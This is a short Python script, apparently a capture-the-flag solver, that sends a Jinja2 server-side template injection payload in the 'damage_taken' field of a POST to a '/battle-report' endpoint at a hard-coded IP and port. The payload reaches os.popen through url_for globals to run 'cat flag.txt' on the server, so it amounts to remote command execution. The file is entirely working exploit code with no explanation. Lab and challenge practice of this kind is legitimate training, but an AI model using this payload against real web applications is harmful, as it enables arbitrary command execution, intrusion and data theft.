import requests

def fire_post(base_url, payload):
    url = f"{base_url}/battle-report"
    data = {"damage_taken": payload}
    # {"damage_dealt": payload}
    # {"spells_cast": payload}
    # {"turns_survived": payload}
    response = requests.post(url, data=data)
    if response.status_code != 200:
        print("Unable to get response from webserver.")
    else:
        content = response.content
        return content



if __name__ == "__main__":
    ip = '94.237.61.100'
    port = '55790'
    response = fire_post(f"http://{ip}:{port}", "{{ url_for.__globals__.sys.modules.os.popen('cat flag.txt').read() }}")
    print(response)